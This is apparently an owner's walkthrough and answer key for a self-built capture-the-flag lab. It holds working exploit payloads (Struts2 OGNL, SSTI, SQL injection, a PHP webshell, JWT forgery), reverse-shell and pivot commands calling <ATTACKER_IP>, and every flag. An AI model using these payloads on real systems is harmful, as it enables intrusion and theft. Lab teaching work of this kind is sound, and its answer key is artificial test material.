# SOLUTION.md (Owner walkthrough)

This is the full owner/author walkthrough for BlueOffice Breach. It
contains exploit details appropriate for a controlled lab you built
and own — do not reuse these techniques against systems you do not
have explicit authorization to test.

For the answer key, see [FLAGS.md](FLAGS.md).

---

## 0. Recon

```bash
nmap -sC -sV -p 21,80,445,2222,3000,5432,7777,8000,8888,9999 <TARGET_IP>
```

Expected results:

| Port | Service | Banner / fingerprint |
|---|---|---|
| 21 | FTP | `220 (vsFTPd 2.3.4)`, anonymous login allowed |
| 80 | HTTP | Minimal portal, endpoints `/app`, `/internal`, `/admin` |
| 445 | SMB | Shares: `Public`, `HR`, `IT`, `Secret`, `Backups` |
| 2222 | SSH | OpenSSH on Ubuntu 22.04 |
| 3000 | HTTP | Login page (client-side JS auth) |
| 5432 | PostgreSQL | Accepts remote `postgres` / `postgres` login |
| 7777 | HTTP | "BlueOffice HR Recruitment Portal", footer credits legacy JBoss |
| 8000 | HTTP | "BlueOffice Dev Panel" login |
| 8888 | HTTP | "Struts2 Showcase" page |
| 9999 | HTTP | Redirects to `/index.php` |

---

## 1. FTP (port 21) — flag.txt

1. `ftp <TARGET_IP> 21`, login as `anonymous` / blank password — succeeds.
2. `ls` shows `fake_flag.txt`. `get` it and read it — it's a troll, not the real flag.
3. The banner `220 (vsFTPd 2.3.4)` is the historically backdoored
   version (CVE-2011-2523). This lab reproduces the same externally
   observable trigger: send a `USER` containing a smiley face `:)`.
4. Trigger the backdoor and connect to the bind shell it opens on
   **port 6200**:
   ```bash
   (printf 'USER backdoor:)\r\n'; sleep 1; printf 'QUIT\r\n'; sleep 1) | nc <TARGET_IP> 21
   nc <TARGET_IP> 6200
   ```
   Or with Metasploit: `use unix/ftp/vsftpd_234_backdoor`, set `RHOSTS`/`RPORT 21`, `run` — it sends the same trigger and connects to 6200 for you.
5. In the resulting shell: `cat flag.txt` (or `whoami`, `pwd` first — you land in `/home/ftpsvc`).

   **Flag:** `CTF{4LW4YS_CH3CK_0LD_CV3S_B3F0R3_M0V1NG_0N}`

---

## 2. Web Command Injection (port 80) — flag1.txt

1. Visit `/` — looks like a default/empty page with no hints in the
   page source.
2. Enumerate with a content/path fuzzer (e.g. `gobuster`/`ffuf`/`dirb`)
   to discover `/app` (decoy status page), `/admin` (decoy 403 page)
   and `/internal`.
3. Visit `/internal` — page looks empty. Try the common vulnerable-lab
   parameter name `cmd`: `/internal?cmd=id`.
4. Confirm command injection: `/internal?cmd=ls` → returns `flag1.txt` and `secret.txt`.
5. Try `/internal?cmd=cat flag1.txt` → blocked (`'cat' is blacklisted`).
   `secret.txt` itself even tells you: *"Some commands may be blacklisted."*
6. Bypass with an equivalent reader that doesn't contain the substring
   `cat`, e.g.:
   ```
   /internal?cmd=tac flag1.txt
   /internal?cmd=more flag1.txt
   /internal?cmd=head -n1 flag1.txt
   /internal?cmd=python3 -c "print(open('flag1.txt').read())"
   ```

   **Flag:** `CTF{Diiiiiiiiir_m3Ak_Foll0w_AS4Hb1_aramon_it}`

---

## 3. Client-Side Auth + SSTI (port 3000) — flag0.txt, then creds for SSH

1. Visit `/`, view page source / JS. The login JS contains the
   hardcoded check:
   ```js
   if (user == "admin" && password == "admin123456789876543212345678987654321234567898765432123456789")
   ```
2. Log in with `admin` / `admin123456789876543212345678987654321234567898765432123456789` → redirected to `/dashboard`.
3. `/dashboard` shows `flag0.txt`:

   **Flag:** `CTF{WelCome_t0_TH2_CTF_lets_G000_4_THe_NEXT!!}`

4. Below it, a "Say hello" input posts to `/welcome`. Sending `test`
   returns `welcome test !`. Sending `{{1*1}}` returns `welcome 1 !` —
   confirmed Jinja2 Server-Side Template Injection.
5. Escalate to RCE with a standard Flask/Jinja2 SSTI payload, e.g.:
   ```
   {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
   ```
6. Read the credential file dropped for this challenge:
   ```
   {{ config.__class__.__init__.__globals__['os'].popen('cat /opt/creds.txt').read() }}
   ```
   This returns:
   ```
   user : chakir
   password : H4RD_P4SS_BR0_20262026
   ```
   (Optional: pop an interactive reverse shell instead, e.g. a Python
   reverse-shell one-liner inside `os.popen(...)`, to a `nc -lvnp`
   listener you control — confirms the RCE is a real shell, still
   confined to this one container.)

---

## 4. SSH + Privilege Escalation (port 2222) — flag4.txt, flag5.txt

1. SSH in with the credentials found in challenge 3:
   ```bash
   ssh chakir@<TARGET_IP> -p 2222
   # password: H4RD_P4SS_BR0_20262026
   ```
2. `cat flag4.txt`:

   **Flag:** `CTF{GR34T_W0RK_Y0U_F0UND_TH3_US3R_FL4G}`

3. `cat note.txt` — points you at `/root` and tells you to privesc.
4. Enumerate: `sudo -l` shows:
   ```
   User chakir may run the following commands on this host:
       (ALL) NOPASSWD: /usr/bin/find
   ```
5. This is a textbook GTFOBins `find` privilege escalation:
   ```bash
   sudo find . -exec /bin/sh \; -quit
   ```
   You now have a root shell inside this container.
6. `cat /root/flag5.txt`:

   **Flag:** `CTF{R00T_W4S_N0T_T00_H4RD_BUT_R3QU1R3D_TH1NK1NG}`

---

## 5. SMB (port 445) — flag3.txt

1. Enumerate shares anonymously:
   ```bash
   smbclient -L //<TARGET_IP>/ -N
   ```
   Shows `Public`, `HR`, `IT`, `Secret`, `Backups`.
2. Connect to `Public` anonymously and pull both files:
   ```bash
   smbclient //<TARGET_IP>/Public -N -c 'get welcome.txt; get it_notice.txt'
   ```
3. Decode `welcome.txt` (base64):
   ```bash
   base64 -d welcome.txt
   ```
4. Decode `it_notice.txt` (space-separated hex):
   ```bash
   xxd -r -p it_notice.txt   # or: cat it_notice.txt | tr -d ' ' | xxd -r -p
   ```
   The decoded hex reads: *"Adam, do not forget: I left an important file for you in the folder named Secret."* — i.e. it names the user **Adam** and points at the **Secret** share.
5. Brute-force / validate the weak password with `nxc` (NetExec, formerly CrackMapExec):
   ```bash
   nxc smb <TARGET_IP> -u Adam -p /usr/share/wordlists/rockyou.txt
   ```
   This recovers `password123`.
6. Access the `Secret` share and read the flag:
   ```bash
   smbclient //<TARGET_IP>/Secret -U 'Adam%password123' -c 'get flag3.txt'
   cat flag3.txt
   ```

   **Flag:** `CTF{GR34T_J0B_Y0U_4R3_0N_TH3_R1GHT_P4TH}`

---

## 6. Apache Struts2 CVE-2017-5638 (port 8888) — flag2.txt

1. Visit `/` — page identifies itself as "Struts2 Showcase, Powered by
   Apache Struts2 2.3.x" with a file upload form.
2. This version/style is associated with **CVE-2017-5638**: a crafted
   `Content-Type` header is parsed by the (vulnerable) multipart
   parser before any request routing happens, leading to OGNL
   expression evaluation / RCE. Send the well-known public PoC payload
   format as the `Content-Type` header on any request:
   ```bash
   curl -s http://<TARGET_IP>:8888/ \
     -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
   ```
   The response body is the output of the command you put in `#cmd='...'`.
3. Swap the command to read the flag directly:
   ```
   #cmd='cat /flag2.txt'
   ```
   Or pop a shell tool / busybox listener for an interactive session — either way, the command only ever executes inside this one container.

   **Flag:** `CTF{CVEs_1s_E4Sy_4_Y0u_By_R2v2rse_SH2LLLLL}`

---

## 7. Dev Panel SQL Injection (port 8000) — localStorage flag

1. Visit `/` (redirects to `/login`).
2. Try a classic authentication-bypass payload in the username field,
   any value in password:
   ```
   username: ' OR '1'='1' -- -
   password: anything
   ```
3. You're logged in as `hamza` (`hamza@technoIT.local`), redirected to
   `/dashboard`.
4. Open browser DevTools → Application/Storage → Local Storage →
   look at the `devpanel_token` key. It contains:
   ```
   RkxBRzEgOiBDVEZ7NExXNFlTXzFOU1AzQ1RfRDNWVDAwTFNfQzRSM0ZVTExZfQ==
   ```
5. Decode it:
   ```bash
   echo 'RkxBRzEgOiBDVEZ7NExXNFlTXzFOU1AzQ1RfRDNWVDAwTFNfQzRSM0ZVTExZfQ==' | base64 -d
   ```

   **Flag:** `FLAG1 : CTF{4LW4YS_1NSP3CT_D3VT00LS_C4R3FULLY}`

---

## 8. LFI (port 9999) — flag6.txt (bonus)

1. Visit `/` → redirected to `/index.php` (plain landing page).
2. Check `/robots.txt`:
   ```
   Disallow: /flag
   ```
3. Visit `/flag` — renders blank with no parameters.
4. Discover the `file` parameter and confirm LFI by reading `/etc/passwd`:
   ```
   /flag?file=/etc/passwd
   ```
5. Read the bonus flag, which sits one directory above the web root
   (`/var/www/flag6.txt`, web root is `/var/www/html`):
   ```
   /flag?file=../flag6.txt
   ```

   **Flag:** `CTF{LF1_1S_N0T_0NLY_P4SSWD_1NSP3CT_F1L3S_C4R3FULLY}`

---

## 9. JBoss HR Portal RCE + Ligolo-ng Pivoting — flag7.txt and flag8.txt

Unlike every earlier challenge, this one is **not** a from-scratch
simulation: `rh-jboss` runs a real, unmodified **JBoss Application
Server 4.0.5** (the well-known `vulhub/jboss:as-4.0.5` image). The
legacy `jmx-console` web console is deployed with its BASIC-auth
security-constraint stripped, so `/jmx-console` and
`/jmx-console/HtmlAdaptor` are reachable **with no credentials at
all** — exactly like the historical, misconfigured JBoss 4.x/5.x
deployments behind CVE-2010-0738. The `jboss.admin:service=
DeploymentFileRepository` MBean exposed through that console is what
`exploit/multi/http/jboss_deploymentfilerepository` targets: it lets
an unauthenticated caller write an arbitrary JSP/WAR straight to the
deploy directory, then trigger it for RCE. The JMX/EJB invokers
(`/invoker/JMXInvokerServlet`, `/invoker/EJBInvokerServlet`) are also
left open and remain a valid fallback via `jboss_invoke_deploy` /
`jboss_maindeployer` / `jboss_bshdeployer`, but the intended path is
the jmx-console one below.

We themed a small HR portal (`BlueOffice HR Recruitment Portal`) as
the JBoss `ROOT` webapp on top of it, so the box looks like an
internal recruitment site rather than a bare JBoss install — but
`/jmx-console/`, `/web-console/` and the invoker servlets are still
there underneath, exactly as JBoss shipped them.

### Step 1 — recon and RCE on rh-jboss (port 7777)

```bash
nmap -sV -p 7777 <TARGET_IP>
curl http://<TARGET_IP>:7777/            # BlueOffice HR Recruitment Portal
curl http://<TARGET_IP>:7777/hr/
curl http://<TARGET_IP>:7777/careers/
gobuster dir -u http://<TARGET_IP>:7777/ -w /usr/share/wordlists/dirb/common.txt
# reveals /jmx-console/, /web-console/, /invoker/JMXInvokerServlet, /invoker/EJBInvokerServlet
curl http://<TARGET_IP>:7777/jmx-console/HtmlAdaptor   # 200, no auth prompt
```

The footer on every HR page ("Powered by legacy JBoss Application
Server") plus the unauthenticated `/jmx-console/HtmlAdaptor` are
enough for a player to recognize this as an old, misconfigured JBoss
target and reach for Metasploit:

```bash
msfconsole
use exploit/multi/http/jboss_deploymentfilerepository
set RHOSTS <TARGET_IP>
set RPORT 7777
set TARGETURI /jmx-console
set TARGET 0
# This target is Java/JBoss, so the payload must be a Java-compatible
# one - java/meterpreter/reverse_tcp or java/shell_reverse_tcp both
# work. TARGET 0 ("Automatic (Java based)") auto-selects the
# "Java Universal" target (id 3); TARGET 1 ("Windows Universal") and
# TARGET 2 ("Linux Universal") do NOT support java/* payloads and
# will fail with an incompatible-payload error, so use TARGET 0 or 3.
set payload java/shell_reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
run
```

Verified working end-to-end against this box on 2026-07-08 (self-test
from the attacker/host machine, `RHOSTS 84.8.217.174`, `RPORT 7777`,
`LHOST 10.0.0.108`, `LPORT 4444`): the module deploys a stager WAR,
calls it, gets a `shell java/java` session back, and cleans up both
the stager and payload WARs via `DeploymentFileRepository.remove()`
on completion — no leftover artifacts on the target. The shell lands
as `root`.

If `jboss_deploymentfilerepository` doesn't fire cleanly against a
given Metasploit version, the invoker-based modules target the same
unauthenticated JBoss install and are equally valid against this box:

```bash
use exploit/multi/http/jboss_invoke_deploy      # JMXInvokerServlet
# or
use exploit/multi/http/jboss_maindeployer       # jmx-console MainDeployer, GET-based
# or
use exploit/multi/http/jboss_bshdeployer        # EJBInvokerServlet, BSH-based
```

No credentials are required for any of these — the jmx-console and
the invoker servlets are all open by design (that *is* the
vulnerability).

### Step 2 — read flag7.txt and find the internal host

```bash
shell
whoami        # root - JBoss 4's startup scripts run it as root
hostname
cat /opt/hr-app/flag7.txt
```

**Flag:** `CTF{JB0SS_Expl01t_Succ2ss_N1Ce_1}`

```bash
cat /opt/hr-app/notes.txt
```
```
HR legacy server note:
The recruitment portal can reach an internal API used by the HR analytics team.
Check local host records and internal routes.
```

```bash
cat /etc/hosts
```
reveals:
```
172.30.80.50 internal-api.blueoffice.local
172.30.80.50 internal-api
```

```bash
ip route
```
shows the container's only route is out through `172.30.80.0/24`
(the `pivotnet` Docker network) — `internal-api` is not reachable
from outside this container at all; the host never published its
ports.

### Step 3 — pivot with ligolo-ng

curl/wget/bash/python3/ip/netstat are all present in the rh-jboss
container, so pull the ligolo-ng agent onto it (e.g. serve it from a
`python3 -m http.server` on your attacker box and `wget`/`curl` it
down through the same shell).

Attacker machine:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

On the compromised rh-jboss container:
```bash
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

Inside the ligolo proxy console:
```text
session
ifconfig
start
```

On the attacker machine, route the pivot subnet through the tun
interface:
```bash
sudo ip route add 172.30.80.0/24 dev ligolo
```

### Step 4 — internal API enumeration and SSRF (port 5000) — flag8.txt

```bash
curl http://172.30.80.50:5000/api
curl http://172.30.80.50:5000/api/status
curl http://172.30.80.50:5000/api/candidates
curl http://172.30.80.50:5000/api/interviews
curl http://172.30.80.50:5000/api/docs
curl "http://172.30.80.50:5000/api/files?name=readme.txt"
```

`readme.txt` lists the internal-api container's own known peer
services, including `127.0.0.1:3000` (the internal analytics
dashboard, also running in the same container, also never published
anywhere). The `name` parameter on `/api/files` is meant to read a
local filename, but any value shaped like `host:port/path` is instead
fetched over HTTP — a classic SSRF hiding behind a "file read"
parameter:

```bash
curl "http://172.30.80.50:5000/api/files?name=127.0.0.1:3000/flag8.txt"
```

**Flag:** `CTF{SSRF_VULN_1NT3RN4L_4P1_0WN3D}`

---

## Confirming every shell stayed inside its container

After getting any shell (FTP backdoor, SSTI RCE, Struts2 RCE, SSH,
sudo privesc), run these from inside the shell to prove it's confined
to a container and not the Oracle Cloud host:

```bash
# 1. /.dockerenv exists only inside a Docker container
ls -la /.dockerenv

# 2. cgroup path will contain "docker" and a long container ID
cat /proc/1/cgroup

# 3. hostname is a short container ID, matching `docker ps` on the host
hostname

# 4. only one network interface (the container's veth/bridge IP),
#    never the host's actual public/private interfaces
ip addr show

# 5. process tree is tiny - only this service's processes, not the
#    full host process list
ps aux

# 6. filesystem has none of the host's other content (no other
#    challenges' files, no host user homes, no Oracle Cloud agent
#    files, etc.)
ls / /root /home 2>/dev/null
```

From the **owner/host side**, cross-check with:
```bash
docker compose ps
docker exec -it blueoffice-<service> hostname   # should match what the player saw
docker stats                                    # confirms mem_limit/pids_limit are active
```

If a `hostname`/cgroup ID a player reports ever matches your actual
Oracle Cloud VM's hostname, or `/.dockerenv` is missing, something is
badly wrong with the deployment — stop and re-check `docker-compose.yml`
for accidental `network_mode: host`, host bind-mounts, or
`privileged: true`.

---

## Resetting the machine

Full clean reset (containers, images, networks — rebuild from scratch):

```bash
./scripts/stop.sh --reset
./scripts/start.sh
```

Quick reset (just recreate containers, keep built images):

```bash
docker compose down
docker compose up -d
```

Since every challenge's content is baked into its image at build time
(no host volumes, no persistent state beyond the SQLite file in the
Dev Panel container and the SMB passdb, both ephemeral per-container),
a reset always returns the machine to its exact original state —
there is nothing for a player to permanently modify.

---

## 10. FST School Access Control + SQL Injection — flag10 and flag12

**flag10 — X-Forwarded-For access control bypass**

1. Visit `/admin` directly:
   ```bash
   curl -i http://<TARGET_IP>:9005/admin
   ```
   Returns `403 Forbidden` — the app only trusts the client IP as
   reported by the `X-Forwarded-For` header, never the real connecting
   socket.
2. Spoof the header to claim you're the local machine:
   ```bash
   curl -H "X-Forwarded-For: 127.0.0.1" http://<TARGET_IP>:9005/admin
   # or
   curl -H "X-Forwarded-For: localhost" http://<TARGET_IP>:9005/admin
   ```

   **Flag:** `CTF{ACce55_Contr01_ByPa55_PFFFFFFFFFF}`

**flag12 — SQL injection on `/login`, dumping the `FST` database**

1. View the landing page source (`view-source:` or `curl -s / `) and
   note the HTML comment referencing Anas and a password following the
   `CTF{...}` format.
2. Try a classic authentication-bypass payload in the username/email
   field, any password (the query is
   `username = '<x>' OR email = '<x>' AND password = '<y>'`, no
   wrapping parens, so a plain `--` comment is enough):
   ```bash
   curl -X POST \
     --data-urlencode "username=nonexistent' OR '1'='1' -- " \
     --data-urlencode "password=anything" \
     http://<TARGET_IP>:9005/login
   ```
   This confirms the injection and logs in as the first student in the
   table.
3. Dump the database with sqlmap, pointed at the same POST body
   (verified working end-to-end — sqlmap detects it as OR boolean-based
   blind on `username`, fingerprints SQLite, and dumps cleanly):
   ```bash
   sqlmap -u "http://<TARGET_IP>:9005/login" \
     --data "username=test&password=test" \
     -p username --batch --level=5 --risk=3 \
     --dbms=sqlite --tables

   sqlmap -u "http://<TARGET_IP>:9005/login" \
     --data "username=test&password=test" \
     -p username --batch --level=5 --risk=3 \
     --dbms=sqlite -T students --dump
   ```
4. In the dumped `students` table, the row with
   `username = anas` / `email = anas@fst.local` has:
   ```
   password: CTF{My_password}
   ```

   **Flag:** `CTF{My_password}`

---

## 11. Next.js Middleware Bypass CVE-2025-29927 — flag11

1. Visit `/` — a plain landing page ("Welcome To Anas Education
   Platform"), no visible links or hints.
2. Guess/enumerate `/flag`:
   ```bash
   curl http://<TARGET_IP>:9000/flag
   ```
   Returns `403 Forbidden`. `/flag` is gated entirely inside
   `middleware.ts` — the page component itself performs no auth check.
3. Next.js versions affected by CVE-2025-29927 (this deployment runs
   `next@15.2.2`) fail to validate the internal
   `x-middleware-subrequest` header, which Next.js normally sets itself
   to avoid re-invoking middleware recursively. Supplying that header
   as a client makes the middleware skip its own auth check entirely:
   ```bash
   curl -H "x-middleware-subrequest: middleware" http://<TARGET_IP>:9000/flag
   ```

   **Flag:** `CTF{NeXT_JS_M1DDLEW4RE_BYpA55_CVE_2025_29927}`

---

## 12. Weak JWT HS256 Secret — flag13

1. Register a normal account:
   ```bash
   curl -c cookies.txt -X POST \
     --data-urlencode "username=player1" \
     --data-urlencode "password=player1pass" \
     http://<TARGET_IP>:1000/register
   ```
   The response shows an issued JWT with `role: user`.
2. View the landing page source — an HTML comment states that every
   token is signed with one weak key containing "your name, four
   numbers, and a symbol at the end", referring to "Nabil".
3. Decode the issued JWT (e.g. on jwt.io or with `pyjwt`) to see its
   header/payload shape: `{"username": "player1", "role": "user", ...}`,
   algorithm `HS256`.
4. Brute-force or simply guess the weak secret implied by the comment:
   `Nabil2027@`.
5. Forge a new token with `role` set to `admin`, signed with that
   secret:
   ```bash
   python3 -c "
   import jwt
   print(jwt.encode({'username': 'player1', 'role': 'admin'}, 'Nabil2027@', algorithm='HS256'))
   "
   ```
6. Access `/admin` with the forged token:
   ```bash
   curl -H "Authorization: Bearer <forged_token>" http://<TARGET_IP>:1000/admin
   ```

   **Flag:** `CTF{WeAK_JWT_PA55_ByP4SS}`

---

## 13. IDOR User Records — flag14

1. Visit `/` — only shows the current date/time ("System Time
   Viewer"), no hints.
2. Discover `/db`, which dumps 20 users with MD5 password hashes —
   confirms 20 user records exist and their IDs are sequential.
3. Discover the `id` parameter (`/profile?id=` or `/?id=`) and
   enumerate it:
   ```bash
   curl "http://<TARGET_IP>:2000/?id=1"
   curl "http://<TARGET_IP>:2000/?id=2"
   ```
   No authentication or ownership check is performed on any ID.
4. Jump straight to the last user:
   ```bash
   curl "http://<TARGET_IP>:2000/?id=20"
   ```
   User 20's `description` field contains the flag.

   **Flag:** `CTF{1D0R_ByPaSS_SuccEeSS!!!!!!}`

---

## 14. Cloud Metadata SSRF — flag15

1. Visit `/` — "BlueOffice Report Generator": paste a URL, it fetches
   and previews it server-side. No visible hints.
2. Confirm the fetch is unrestricted (any host, not just a small
   allowlist) by pointing it at an external site, then at the app's
   own port.
3. Try the app's own simulated cloud instance metadata path directly
   from outside first, to confirm it's not reachable externally:
   ```bash
   curl -i http://<TARGET_IP>:4000/opc/v2/instance/
   ```
   Returns `403 Forbidden` — that route only answers requests coming
   from `127.0.0.1`.
4. Use the report-preview SSRF to make the *server itself* request
   that same path over its own loopback:
   ```bash
   curl -X POST --data-urlencode "url=http://127.0.0.1:5000/opc/v2/instance/" \
     http://<TARGET_IP>:4000/
   ```
   The returned JSON's `metadata.flag` field contains the flag.

   **Flag:** `CTF{SSRF_TO_TH3_CL0UD_M3T4D4T4_OWN3D}`

---

## 15. File Upload Extension Bypass RCE — flag16

1. Visit `/` — "BlueOffice ID Badge Photo Upload", a plain upload form
   that claims to accept JPG/PNG only.
2. Confirm the filter rejects an obvious `.php` file:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   curl -F "photo=@shell.php" http://<TARGET_IP>:4500/upload.php
   ```
   Returns "Only JPG or PNG files are allowed."
3. The check only verifies that `.jpg`/`.jpeg`/`.png` appears
   *somewhere* in the filename (not that it's the real final
   extension). Rename the shell so it contains `.jpg` but still ends
   in `.php`:
   ```bash
   cp shell.php shell.jpg.php
   curl -F "photo=@shell.jpg.php" http://<TARGET_IP>:4500/upload.php
   ```
   The upload succeeds — Apache will execute it as PHP because the
   real, final extension is `.php`.
4. Trigger the webshell and read the flag:
   ```bash
   curl "http://<TARGET_IP>:4500/uploads/shell.jpg.php?cmd=cat+/var/www/flag_upload.txt"
   ```

   **Flag:** `CTF{UPL0AD_BYP4SS_W3BSH3LL_RCE}`

---

## 16. PostgreSQL Weak Credentials — flag17

1. Port scan turns up PostgreSQL listening directly on the host:
   ```bash
   nmap -sV -p 5432 <TARGET_IP>
   ```
2. Try the obvious default/weak credential pair:
   ```bash
   psql -h <TARGET_IP> -p 5432 -U postgres -d blueoffice
   # Password: postgres
   ```
   It works — `postgres` / `postgres` authenticates remotely with no
   restrictions.
3. Enumerate what's on the server:
   ```sql
   \l
   ```
   Two databases stand out beyond the defaults: `blueoffice` (the
   realistic-looking corporate data — `clients`, `employees`,
   `departments`, `deals`, `invoices`, `projects`, `users`) and a
   separate `flags` database, which is the interesting one.
4. Switch to it and look at what it holds:
   ```sql
   \c flags
   \dt
   SELECT username, account_status, internal_note FROM users;
   ```
   Most rows are mundane-looking system/service accounts
   (`backup_service`, `audit_reader`, `hr_sync`, `reporting_bot`,
   `svc_monitoring`, `db_replication`, `etl_pipeline`,
   `vendor_integration`). One row, `legacy_admin`, has an
   `internal_note` describing a leftover account from a 2021
   migration that was never rotated off its original bootstrap
   password — the flag is embedded directly in that note.

   **Flag:** `CTF{Alw4y5_cHeK_TH2_D2FaulT_P4ss}`
